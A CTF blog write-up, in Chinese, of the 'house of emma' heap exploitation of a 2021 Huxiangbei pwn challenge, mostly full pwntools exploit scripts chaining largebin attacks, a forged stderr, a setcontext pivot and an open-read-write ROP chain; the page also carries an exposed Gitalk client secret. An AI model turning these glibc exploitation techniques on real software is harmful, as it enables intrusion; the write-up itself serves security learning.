@@ -1,0 +1,737 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+  <title>
+    
+    house of emma 21湖湘杯复现 丨
+    
+
+    Whirling-In-Rags
+  </title>
+
+  
+  <link rel="shortcut icon" href="/icon.svg">
+  
+
+  <link rel="preconnect" href="https://cdnjs.cloudflare.com">
+  
+  <link id="theme" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-light.css">
+  <script src="https://unpkg.com/@highlightjs/cdn-assets@11.9.0/highlight.min.js"></script>
+  
+
+  <!-- 字体 -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+
+  
+<link rel="stylesheet" href="/css/root.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/post.css">
+
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Whirling-In-Rags" type="application/atom+xml">
+</head>
+
+  <body>
+    <header class="header">
+  <section class="header-container">
+    <a class="logo" href="/">Whirling-In-Rags</a>
+    <ul class="nav">
+      
+      <li><a href="/archives">archives</a></li>
+      
+      <li><a href="/tags">tags</a></li>
+      
+      <li><a href="/about">about</a></li>
+      
+    </ul>
+  </section>
+</header>
+      
+            <main class="main">
+              <article class="post">
+  
+  <div class="post-title">house of emma 21湖湘杯复现</div>
+  <div class="post-meta">
+    <div class="date">2023 七月 27日</div>
+    <div class="tags">
+      
+      <a class="tag-item" href="/tags/pwn" style="color: #d1d5da;">pwn</a>
+      
+      <a class="tag-item" href="/tags/wp" style="color: #d1d5da;">wp</a>
+      
+      <a class="tag-item" href="/tags/iofile" style="color: #d1d5da;">iofile</a>
+      
+    </div>
+  </div>
+  
+
+  <main class="post-content"><blockquote>
+<p>讲水课，恰大米</p>
+</blockquote>
+<p>沙箱开启，考虑orw</p>
+<p>保护全开</p>
+<h2 id="VM分析"><a href="#VM分析" class="headerlink" title="VM分析"></a>VM分析</h2><p>循环输入，每次读最多0x500，每次循环分配释放0x2000空间</p>
+<p>注意这里每次循环时的malloc,会影响后面的堆风水</p>
+<h3 id="入口函数分析"><a href="#入口函数分析" class="headerlink" title="入口函数分析"></a>入口函数分析</h3><p><code>sub_1288</code>处无法识别</p>
+<p>undefine后，由gdb动调知入口在0x1289处，修复为函数</p>
+<p>将输入的字符串指针存在<code>[rbp-18h]</code>处</p>
+<p><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230720151519060.png" alt="image-20230720151519060"></p>
+<p>随后取第一个byte，与运算0Fh，进行一个没什么用的检查，再将该值*4放入<code>rdx</code>，与一个首地址相加放入<code>eax</code>，符号拓展为<code>rax</code>（因为是负数），再与该首地址相加（<code>rax</code>为补码，实际为相减），其中算负数计算式为<code>hex((~0xfffffffffffff3a1&amp;0xffffffffffffffff)+0x1)</code>，随后跳转到该位置</p>
+<p><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230720152303704.png" alt="image-20230720152303704"></p>
+<table>
+<thead>
+<tr>
+<th>0</th>
+<th>1</th>
+<th>2</th>
+<th>3</th>
+<th>4</th>
+<th>5</th>
+<th>6</th>
+<th>7</th>
+<th>8</th>
+<th>9</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1488h</td>
+<td>13ddh</td>
+<td>1404h</td>
+<td>1428h</td>
+<td>144ch</td>
+<td>1481h</td>
+<td>12dah</td>
+<td>130dh</td>
+<td>13abh</td>
+<td>1342h</td>
+</tr>
+<tr>
+<td>fail</td>
+<td>add</td>
+<td>delet</td>
+<td>show</td>
+<td>edit</td>
+<td>leave&amp;ret</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230721133000180.png" alt="image-20230721133000180"></p>
+<p>连按d修复跳转表，观察补码可知为4字节一组</p>
+<p>其实可以用ida的edit-&gt;other-&gt;specify switch idiom功能修复为switch</p>
+<h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><ul>
+<li>index 2nd byte</li>
+<li>size 2nd word</li>
+<li><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230718174743516-1689673665848-1.png" alt="image-20230718174743516"></li>
+<li>+4&amp;jump to start</li>
+</ul>
+<h3 id="delet"><a href="#delet" class="headerlink" title="delet"></a>delet</h3><ul>
+<li><p>index 2nd byte</p>
+</li>
+<li><p>uaf</p>
+</li>
+<li><p><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230718174950029.png" alt="image-20230718174950029"></p>
+</li>
+<li><p>+2</p>
+</li>
+</ul>
+<h3 id="show"><a href="#show" class="headerlink" title="show"></a>show</h3><ul>
+<li><p>index 2nd byte</p>
+</li>
+<li><p><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230718175134076.png" alt="image-20230718175134076"></p>
+</li>
+<li><p>+2</p>
+</li>
+</ul>
+<h3 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h3><ul>
+<li>index 2nd byte</li>
+<li>size 2nd word</li>
+<li>content 2nd dword, size</li>
+<li><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230719093944933.png" alt="image-20230719093944933"></li>
+</ul>
+<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>存在UAF，可多次进行largbin attack</p>
+<p>无法改写为任意地址，无法直接house of kiwi，考虑house of emma</p>
+<ul>
+<li><p>泄露libc、heap基址</p>
+</li>
+<li><p>两次largbin attack改写<code>stderr</code>和<code>__pointer_chk_guard</code></p>
+</li>
+<li><p>合理伪造stderr与IO链</p>
+</li>
+<li><p>触发<code>__malloc_assert</code></p>
+</li>
+</ul>
+<h2 id="堆布局与largbin-attack"><a href="#堆布局与largbin-attack" class="headerlink" title="堆布局与largbin attack"></a>堆布局与largbin attack</h2><h3 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h3><pre><code class="python">add(0,0x420)
+add(1,0x440)
+add(2,0x440)#largebins(9)-&gt;fakestderr(after attack pointerguard)
+add(3,0x440)
+add(5,0x430)#(7)(8)-&gt;pointer guard
+add(6,0x420)
+delet(0)
+delet(2)
+show(0)#获取libc基址
+sendit()
+
+libc_base = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&quot;\x00&quot;))-0x1f2cc0
+stderr_addr = libc_base + libc.sym[&#39;stderr&#39;]
+fixed_heap_fdbk = libc_base + 0x1f30c0
+setcontex61 = libc_base + 0x50bfd
+point_guard = libc_base + 0x3c0740 + 0x30
+log.success(&quot;libc_base = &#123;&#125;&quot;.format(hex(libc_base)))
+log.success(&quot;stderr = &#123;&#125;&quot;.format(hex(stderr_addr)))
+log.success(&quot;setcontex+61 = &#123;&#125;&quot;.format(hex(setcontex61)))
+log.success(&quot;point_guard = &#123;&#125;&quot;.format(hex(point_guard)))
+add(4,0x410)
+edit(2,16,cyclic(16))
+show(2)
+sendit()
+
+p.recvuntil(&quot;daaa&quot;)
+heap_base = u64(p.recvn(6).ljust(8,b&quot;\x00&quot;))-0x880
+log.success(&quot;heap0_base = &#123;&#125;&quot;.format(hex(heap_base)))
+</code></pre>
+<p>free掉任意一个unsorted bin可获取libc基址</p>
+<blockquote>
+<p>问题：这里的chunk 0为什么能保持在unsorted bin中，而没有在循环开始malloc0x2000时放入large bin？</p>
+<p>因为chunk 0和0x2000紧邻，每次完成循环都会触发合并，并在分配时被切下来</p>
+</blockquote>
+<p>构造0&lt;2，free掉后申请一块较小的chunk，将2放入largebin以获取heap基址</p>
+<p>注意输出存在截断，可以先把2的fd,bk部分填满，事后记得要修复</p>
+<p>注意largbin大小0x440~0x480为一个范围，为后续largebin attack起见，应注意预留大小</p>
+<h3 id="largebin-attack-2"><a href="#largebin-attack-2" class="headerlink" title="largebin attack*2"></a>largebin attack*2</h3><p>largebin attack的利用方式：</p>
+<ol>
+<li>将一个较大的、largebin中的chunk的bk_nextsize覆盖为[target-0x20]</li>
+<li>将一个较小的chunk放入<strong>同一个</strong>largebin，触发unlink</li>
+<li>此时[target]的内容被修改为较小chunk的地址</li>
+</ol>
+<pre><code class="python">#attack stderr
+payload = p64(fixed_heap_fdbk)*2 + p64(heap_base+0x880) + p64(stderr_addr-0x20)#构造的同时顺便修复
+edit(2,32,payload)
+delet(5)
+sendit()
+#attack point_guart
+add(7,0x430)
+payload = p64(fixed_heap_fdbk)*2 + p64(heap_base+0x880) + p64(point_guard-0x20)
+edit(2,32,payload)
+delet(7)
+sendit()
+</code></pre>
+<p>将5free掉，放入largebin，打出一次attack，修改stderr</p>
+<p>又通过7将5申请回来，（这里申请之前没有修复，导致stderr指向了2）</p>
+<p>随后再更改2，再free掉7（5），打出第二次attack，修改point_guard</p>
+<h3 id="pointer-chk-guard"><a href="#pointer-chk-guard" class="headerlink" title="__pointer_chk_guard"></a>__pointer_chk_guard</h3><p>该值存在于fs:0x30</p>
+<p>tls基址查看方式为<code>fsbase</code>或<code>tls</code>（pwngdb)，加上0x30即为guard值</p>
+<p>也可以直接用gdb</p>
+<pre><code class="shell">(gdb) call arch_prctl(0x1003, $rsp - 0x8)    
+$2 = 0 
+(gdb) x /gx $rsp - 0x8
+0x7fffffffe6e8: 0x00007ffff7fe0700   =&gt; IA32_FS_BASE
+</code></pre>
+<p>本地gdb调试时该值与libc偏移可能改变，调试时可以先关闭aslr</p>
+<pre><code class="shell">$ sudo sysctl -w kernel.randomize_va_space=0
+</code></pre>
+<h3 id="修复largebin与准备触发-malloc-assert"><a href="#修复largebin与准备触发-malloc-assert" class="headerlink" title="修复largebin与准备触发__malloc_assert"></a>修复largebin与准备触发__malloc_assert</h3><pre><code class="python">#largbin fix
+payload = p64(heap_base+0x1120)+p64(libc_base+0x1f30c0)+p64(heap_base+0x1120)*2
+edit(2,32,payload)
+payload = p64(libc_base+0x1f30c0)+p64(heap_base+0x880)*3
+edit(7,32,payload)
+sendit()
+#prepare assert
+add(8,0x430)
+delet(6)
+add(9,0x440)
+add(10,0x410)
+edit(6,0x420,cyclic(0x418)+p64(0x10))
+sendit()
+</code></pre>
+<p>先分别修补两个largebin，防止分配时发生错误</p>
+<p>申请8填补5,申请9填补2</p>
+<p>将最外层的chunk 6 free掉，加入unsorted bin并与top chunk合并</p>
+<p>再申请一块略小于6的chunk 10，通过修改chunk 6的内容修改top chunk的size段</p>
+<p>此处改为0x10使之页不对齐</p>
+<p>后面只需要申请一个chunk就可以触发<code>__malloc_assert</code></p>
+<h2 id="构造IO利用链"><a href="#构造IO利用链" class="headerlink" title="构造IO利用链"></a>构造IO利用链</h2><h3 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a>gadget</h3><p>假设我们控制了<code>stderr</code>，进入了<code>_IO_cookie_write</code>，调用函数指针<code>write_cb</code>，此时我们只能控制进入函数时的<code>rdi</code>，而控制<code>setcontext</code>需要控制rdx</p>
+<p>碰巧有一个gadget，能够利用<code>rdi</code>控制<code>rdx</code>，还能call一个和<code>rdx</code>相关的地址</p>
+<p><img src="/../img/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0.assets/image-20230720211806875.png" alt="image-20230720211806875"></p>
+<pre><code class="python">gadget = libc_base + 0x0000000000146020
+#mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
+ret = libc_base + 0x000000000002d446
+pop_rax = libc_base + 0x00000000000446c0
+pop_rdi = libc_base + 0x000000000002daa2
+pop_rsi = libc_base + 0x0000000000037c0a
+syscall = libc_base + 0x00000000000883b6
+</code></pre>
+<h3 id="fake-stderr"><a href="#fake-stderr" class="headerlink" title="fake stderr"></a>fake stderr</h3><pre><code class="python">def ROL(content, n):
+    num = bin(content)[2:].rjust(64,&#39;0&#39;)
+    return int(num[n:]+num[:n],2)
+
+#fake stderr
+payload = p64(0)*3
+payload += p64(0xffffffffffffffff)
+payload = payload.ljust(0x78,&quot;\x00&quot;)
+payload += p64(libc_base + libc.sym[&#39;_IO_stdfile_2_lock&#39;])
+payload = payload.ljust(0xc8,&quot;\x00&quot;)
+payload += p64(libc_base + libc.sym[&#39;_IO_cookie_jumps&#39;]+0x40)
+payload += p64(heap_base+0x10) #chunk 0-&gt;rdi
+payload += p64(0)
+payload += p64(ROL(gadget^(heap_base+0x1120),0x11))
+edit(2,0xe8,payload)
+sendit()
+</code></pre>
+<p>进入<code>__malloc_assert</code>后，利用<code>__malloc_assert -&gt; __fxprintf -&gt; __vfxprintf -&gt; locked_vfxprintf -&gt; __vfprintf_internal -&gt; _IO_new_file_xsputn ( =&gt; _IO_cookie_write)</code>调用链</p>
+<p>需要满足<code>_IO_write_ptr &gt; _IO_write_base</code>，且<code>_lock</code>指向可写地址，此处直接使用原地址<code>_IO_stdfile_2_lock</code></p>
+<p><code>vtable</code>需要伪造，触发IO时，原本指向<code>_IO_file_jumps -&gt; __xsputn</code>，即<code>&lt;__GI__IO_file_jumps+56&gt;</code>，需要伪造为<code>_IO_cookie_jumps-&gt; __write</code>，即<code>&lt;_IO_cookie_jumps+120&gt;</code>，故此处填上<code>_IO_cookie_jumps+0x40</code></p>
+<p>构造<code>__cookie</code>为chunk 0的地址，注意为了方便更改，地址加上0x10，之后chunk 0的用户地址会进入<code>rdi</code></p>
+<p>构造<code>cookie_write_function_t *write</code>处指针为gadget地址，调用时直接运行gadget，此处有加密</p>
+<h3 id="rdi-rdx"><a href="#rdi-rdx" class="headerlink" title="rdi -&gt; rdx"></a>rdi -&gt; rdx</h3><pre><code class="python">#rdi-&gt;rdx
+payload = p64(0)#rdi
+payload += p64(heap_base + 0x1120+0x10)#rdx-&gt;chunk 5
+edit(0,0x10,payload)
+sendit()
+</code></pre>
+<p>修改chunk 0，使rdx指向chunk5</p>
+<h3 id="布置rdx附近满足setcontext"><a href="#布置rdx附近满足setcontext" class="headerlink" title="布置rdx附近满足setcontext"></a>布置rdx附近满足setcontext</h3><pre><code class="python">#rdx-&gt;setcontext
+payload = p64(0)*3 + &quot;./flag\x00\x00&quot;
+payload += p64(setcontex61)#call [rdx+0x20]
+payload = payload.ljust(0x68,&quot;\x00&quot;)
+payload += p64(heap_base + 0x1120+0x10+0x18)#rdi-&gt;./flag
+payload += p64(0)#rsi-&gt;0
+payload = payload.ljust(0x88,&quot;\x00&quot;)
+payload += p64(0x100)#rdx-&gt;0
+payload = payload.ljust(0xa0)
+payload += p64(heap_base+0x430+0x10)#rsp-&gt;chunk 1
+payload += p64(ret)#rcx-&gt;ret
+edit(5,0xb0,payload)
+sendit()
+</code></pre>
+<p>根据setcontext+61，布置<code>rdx</code>周围，使寄存器满足条件</p>
+<p><code>rsp</code>指向chunk 1，<code>rcx</code>指向ret，将栈迁移到chunk 1上</p>
+<h3 id="orw-chain"><a href="#orw-chain" class="headerlink" title="orw chain"></a>orw chain</h3><pre><code class="python">#orw chain
+payload = p64(pop_rax)
+payload += p64(2)
+payload += p64(syscall)#open
+payload += p64(pop_rax)
+payload += p64(0)
+payload += p64(pop_rdi)
+payload += p64(3)
+payload += p64(pop_rsi)
+payload += p64(heap_base + 0x200)
+payload += p64(syscall)#read
+payload += p64(pop_rax)
+payload += p64(1)
+payload += p64(pop_rdi)
+payload += p64(1)
+payload += p64(pop_rsi)
+payload += p64(heap_base + 0x200)
+payload += p64(syscall)#write
+
+edit(1,17*8,payload)
+sendit()
+</code></pre>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><pre><code class="python">#!/usr/bin/env python2
+from pwn import*
+
+context(os = &#39;linux&#39;, arch = &#39;amd64&#39;, log_level = &#39;debug&#39;, terminal = [&#39;tmux&#39;, &#39;new-window&#39;])
+def debug(cmd=&#39;&#39;):
+    cmd += &quot;b *$rebase(0x1289)\nb *$rebase(0x1536)\nb *$rebase(0x15a4)\n *$rebase(0x13dd)\n&quot;
+    gdb.attach(p, cmd)
+    pause()
+
+host = &quot;&quot;
+port = 0
+p = process(&quot;./pwn&quot;)
+#pt = remote(host, port)
+libc = ELF(&#39;./libc.so.6&#39;)
+
+pl = &quot;&quot;
+tls_offset = 0x3c0740
+
+def add(index, size):
+#size(0x40f,0x500]
+    global pl
+    pl += p8(1)
+    pl += p8(index)
+    pl += p16(size)
+
+def delet(index):
+    global pl
+    pl += p8(2)
+    pl += p8(index)
+
+def	show(index):
+    global pl
+    pl += p8(3)
+    pl += p8(index)
+
+def edit(index, size, str):
+    global pl
+    pl += p8(4)
+    pl += p8(index)
+    pl += p16(size)
+    pl += str
+
+def sendit():
+    global pl
+    pl += p8(5)
+    p.sendlineafter(&quot;opcode\n&quot;, pl)
+    pl = &quot;&quot;
+
+def ROL(content, n):
+    num = bin(content)[2:].rjust(64,&#39;0&#39;)
+    return int(num[n:]+num[:n],2)
+
+add(0,0x420)
+add(1,0x440)
+add(2,0x440)#largebins(9)-&gt;fakestderr(after attack pointerguard)
+add(3,0x440)
+add(5,0x430)#(7)(8)-&gt;pointer guard
+add(6,0x420)
+delet(0)
+delet(2)
+show(0)
+sendit()
+
+libc_base = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&quot;\x00&quot;))-0x1f2cc0
+stderr_addr = libc_base + libc.sym[&#39;stderr&#39;]
+fixed_heap_fdbk = libc_base + 0x1f30c0
+setcontex61 = libc_base + 0x50bfd
+point_guard = libc_base + tls_offset + 0x30
+log.success(&quot;libc_base = &#123;&#125;&quot;.format(hex(libc_base)))
+log.success(&quot;stderr = &#123;&#125;&quot;.format(hex(stderr_addr)))
+log.success(&quot;setcontex+61 = &#123;&#125;&quot;.format(hex(setcontex61)))
+log.success(&quot;point_guard = &#123;&#125;&quot;.format(hex(point_guard)))
+add(4,0x410)
+edit(2,16,cyclic(16))
+show(2)
+sendit()
+
+p.recvuntil(&quot;daaa&quot;)
+heap_base = u64(p.recvn(6).ljust(8,b&quot;\x00&quot;))-0x880
+log.success(&quot;heap0_base = &#123;&#125;&quot;.format(hex(heap_base)))
+
+#attack stderr
+payload = p64(fixed_heap_fdbk)*2 + p64(heap_base+0x880) + p64(stderr_addr-0x20)
+edit(2,32,payload)
+delet(5)
+sendit()
+#attack point_guart
+add(7,0x430)
+payload = p64(fixed_heap_fdbk)*2 + p64(heap_base+0x880) + p64(point_guard-0x20)
+edit(2,32,payload)
+delet(7)
+sendit()
+#largbin fix
+payload = p64(heap_base+0x1120)+p64(libc_base+0x1f30c0)+p64(heap_base+0x1120)*2
+edit(2,32,payload)
+payload = p64(libc_base+0x1f30c0)+p64(heap_base+0x880)*3
+edit(7,32,payload)
+sendit()
+#prepare assert
+add(8,0x430)
+delet(6)
+add(9,0x440)
+add(10,0x410)
+edit(6,0x420,cyclic(0x418)+p64(0x10))
+sendit()
+
+gadget = libc_base + 0x0000000000146020
+#mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
+ret = libc_base + 0x000000000002d446
+pop_rax = libc_base + 0x00000000000446c0
+pop_rdi = libc_base + 0x000000000002daa2
+pop_rsi = libc_base + 0x0000000000037c0a
+syscall = libc_base + 0x00000000000883b6
+
+#fake stderr
+payload = p64(0)*3
+payload += p64(0xffffffffffffffff)
+payload = payload.ljust(0x78,&quot;\x00&quot;)
+payload += p64(libc_base + libc.sym[&#39;_IO_stdfile_2_lock&#39;])
+payload = payload.ljust(0xc8,&quot;\x00&quot;)
+payload += p64(libc_base + libc.sym[&#39;_IO_cookie_jumps&#39;]+0x40)
+payload += p64(heap_base+0x10) #chunk 0-&gt;rdi
+payload += p64(0)
+payload += p64(ROL(gadget^(heap_base+0x1120),0x11))
+edit(2,0xe8,payload)
+sendit()
+#rdi-&gt;rdx
+payload = p64(0)#rdi
+payload += p64(heap_base + 0x1120+0x10)#rdx-&gt;chunk 5
+edit(0,0x10,payload)
+sendit()
+#rdx-&gt;setcontext
+payload = p64(0)*3 + &quot;./flag\x00\x00&quot;
+payload += p64(setcontex61)#call [rdx+0x20]
+payload = payload.ljust(0x68,&quot;\x00&quot;)
+payload += p64(heap_base + 0x1120+0x10+0x18)#rdi-&gt;./flag
+payload += p64(0)#rsi-&gt;0
+payload = payload.ljust(0x88,&quot;\x00&quot;)
+payload += p64(0x100)#rdx-&gt;0
+payload = payload.ljust(0xa0)
+payload += p64(heap_base+0x430+0x10)#rsp-&gt;chunk 1
+payload += p64(ret)#rcx-&gt;ret
+edit(5,0xb0,payload)
+sendit()
+#orw chain
+payload = p64(pop_rax)
+payload += p64(2)
+payload += p64(syscall)#open
+payload += p64(pop_rax)
+payload += p64(0)
+payload += p64(pop_rdi)
+payload += p64(3)
+payload += p64(pop_rsi)
+payload += p64(heap_base + 0x200)
+payload += p64(syscall)#read
+payload += p64(pop_rax)
+payload += p64(1)
+payload += p64(pop_rdi)
+payload += p64(1)
+payload += p64(pop_rsi)
+payload += p64(heap_base + 0x200)
+payload += p64(syscall)#write
+edit(1,17*8,payload)
+sendit()
+
+#trigger assert
+add(11,0x500)
+sendit()
+
+p.interactive()
+</code></pre>
+<pre><code class="python">#!/usr/bin/env python2
+from pwn import*
+
+context(os = &#39;linux&#39;, arch = &#39;amd64&#39;, log_level = &#39;debug&#39;, terminal = [&#39;tmux&#39;, &#39;new-window&#39;])
+def debug(cmd=&#39;&#39;):
+    cmd += &quot;b *$rebase(0x1289)\nb *$rebase(0x1536)\nb *$rebase(0x15a4)\n *$rebase(0x13dd)\n&quot;
+    gdb.attach(p, cmd)
+    pause()
+
+for x in range(0x10):
+    for y in range(0x10):
+        try:	
+            offset = 0x300740
+            tls_offset = offset
+            tls_offset += x &lt;&lt; 16
+            tls_offset += y &lt;&lt; 12
+            log.success(&quot;try offset:\t&quot; + hex(tls_offset))
+
+            host = &quot;&quot;
+            port = 0
+            p = process(&quot;./pwn&quot;)
+            #pt = remote(host, port)
+            libc = ELF(&#39;./libc.so.6&#39;)
+
+            pl = &quot;&quot;
+
+            def add(index, size):
+            #size(0x40f,0x500]
+                global pl
+                pl += p8(1)
+                pl += p8(index)
+                pl += p16(size)
+
+            def delet(index):
+                global pl
+                pl += p8(2)
+                pl += p8(index)
+
+            def	show(index):
+                global pl
+                pl += p8(3)
+                pl += p8(index)
+
+            def edit(index, size, str):
+                global pl
+                pl += p8(4)
+                pl += p8(index)
+                pl += p16(size)
+                pl += str
+
+            def sendit():
+                global pl
+                pl += p8(5)
+                p.sendlineafter(&quot;opcode\n&quot;, pl)
+                pl = &quot;&quot;
+
+            def ROL(content, n):
+                num = bin(content)[2:].rjust(64,&#39;0&#39;)
+                return int(num[n:]+num[:n],2)
+
+            add(0,0x420)
+            add(1,0x440)
+            add(2,0x440)#largebins(9)-&gt;fakestderr(after attack pointerguard)
+            add(3,0x440)
+            add(5,0x430)#(7)(8)-&gt;pointer guard
+            add(6,0x420)
+            delet(0)
+            delet(2)
+            show(0)
+            sendit()
+
+            libc_base = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&quot;\x00&quot;))-0x1f2cc0
+            stderr_addr = libc_base + libc.sym[&#39;stderr&#39;]
+            fixed_heap_fdbk = libc_base + 0x1f30c0
+            setcontex61 = libc_base + 0x50bfd
+            point_guard = libc_base + tls_offset + 0x30
+            log.success(&quot;libc_base = &#123;&#125;&quot;.format(hex(libc_base)))
+            log.success(&quot;stderr = &#123;&#125;&quot;.format(hex(stderr_addr)))
+            log.success(&quot;setcontex+61 = &#123;&#125;&quot;.format(hex(setcontex61)))
+            log.success(&quot;point_guard = &#123;&#125;&quot;.format(hex(point_guard)))
+            add(4,0x410)
+            edit(2,16,cyclic(16))
+            show(2)
+            sendit()
+
+            p.recvuntil(&quot;daaa&quot;)
+            heap_base = u64(p.recvn(6).ljust(8,b&quot;\x00&quot;))-0x880
+            log.success(&quot;heap0_base = &#123;&#125;&quot;.format(hex(heap_base)))
+
+            #attack stderr
+            payload = p64(fixed_heap_fdbk)*2 + p64(heap_base+0x880) + p64(stderr_addr-0x20)
+            edit(2,32,payload)
+            delet(5)
+            sendit()
+            #attack point_guart
+            add(7,0x430)
+            payload = p64(fixed_heap_fdbk)*2 + p64(heap_base+0x880) + p64(point_guard-0x20)
+            edit(2,32,payload)
+            delet(7)
+            sendit()
+            #largbin fix
+            payload = p64(heap_base+0x1120)+p64(libc_base+0x1f30c0)+p64(heap_base+0x1120)*2
+            edit(2,32,payload)
+            payload = p64(libc_base+0x1f30c0)+p64(heap_base+0x880)*3
+            edit(7,32,payload)
+            sendit()
+            #prepare assert
+            add(8,0x430)
+            delet(6)
+            add(9,0x440)
+            add(10,0x410)
+            edit(6,0x420,cyclic(0x418)+p64(0x10))
+            sendit()
+
+            gadget = libc_base + 0x0000000000146020
+            #mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
+            ret = libc_base + 0x000000000002d446
+            pop_rax = libc_base + 0x00000000000446c0
+            pop_rdi = libc_base + 0x000000000002daa2
+            pop_rsi = libc_base + 0x0000000000037c0a
+            syscall = libc_base + 0x00000000000883b6
+
+
+            #fake stderr
+            payload = p64(0)*3
+            payload += p64(0xffffffffffffffff)
+            payload = payload.ljust(0x78,&quot;\x00&quot;)
+            payload += p64(libc_base + libc.sym[&#39;_IO_stdfile_2_lock&#39;])
+            payload = payload.ljust(0xc8,&quot;\x00&quot;)
+            payload += p64(libc_base + libc.sym[&#39;_IO_cookie_jumps&#39;]+0x40)
+            payload += p64(heap_base+0x10) #chunk 0-&gt;rdi
+            payload += p64(0)
+            payload += p64(ROL(gadget^(heap_base+0x1120),0x11))
+            edit(2,0xe8,payload)
+            sendit()
+            #rdi-&gt;rdx
+            payload = p64(0)#rdi
+            payload += p64(heap_base + 0x1120+0x10)#rdx-&gt;chunk 5
+            edit(0,0x10,payload)
+            sendit()
+            #rdx-&gt;setcontext
+            payload = p64(0)*3 + &quot;./flag\x00\x00&quot;
+            payload += p64(setcontex61)#call [rdx+0x20]
+            payload = payload.ljust(0x68,&quot;\x00&quot;)
+            payload += p64(heap_base + 0x1120+0x10+0x18)#rdi-&gt;./flag
+            payload += p64(0)#rsi-&gt;0
+            payload = payload.ljust(0x88,&quot;\x00&quot;)
+            payload += p64(0x100)#rdx-&gt;0
+            payload = payload.ljust(0xa0)
+            payload += p64(heap_base+0x430+0x10)#rsp-&gt;chunk 1
+            payload += p64(ret)#rcx-&gt;ret
+            edit(5,0xb0,payload)
+            sendit()
+            #orw chain
+            payload = p64(pop_rax)
+            payload += p64(2)
+            payload += p64(syscall)#open
+            payload += p64(pop_rax)
+            payload += p64(0)
+            payload += p64(pop_rdi)
+            payload += p64(3)
+            payload += p64(pop_rsi)
+            payload += p64(heap_base + 0x200)
+            payload += p64(syscall)#read
+            payload += p64(pop_rax)
+            payload += p64(1)
+            payload += p64(pop_rdi)
+            payload += p64(1)
+            payload += p64(pop_rsi)
+            payload += p64(heap_base + 0x200)
+            payload += p64(syscall)#write
+
+            edit(1,17*8,payload)
+            sendit()
+
+            #trigger assert
+            add(11,0x500)
+            sendit()
+            r=p.recvuntil(&quot;flag&quot;)
+            flag = r+p.recvuntil(&quot;&#125;&quot;)
+            log.success(flag)
+            p.interactive()
+        except:	
+            p.close()
+</code></pre>
+</main>
+
+  
+    <div id="gitalk-container"></div> 
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+
+if(true){
+	var gitalk = new Gitalk({
+  	clientID: 'Ov23liOeINaDo82m26KW',
+  	clientSecret: '40d0c404806ec19c706fad7b692aba1c3a281818',
+  	repo: 'DeePunk42.github.io',
+  	owner: 'DeePunk42',
+  	admin: ['DeePunk42'],
+  	id: 'Thu Jul 27 2023 11:12:57 GMT+0800',
+  	distractionFreeMode: 'true'
+})
+gitalk.render('gitalk-container') 
+}
+</script>
+    
+</article>
+
+
+<script src="/js/highlight.js"></script>
+
+            </main>
+            
+              <footer class="footer">
+  
+  <span>Copyright © 2021 DeePunk</span>
+  
+</footer>
+                
+<script src="/js/theme.js"></script>
+
+  </body>
+
+</html>
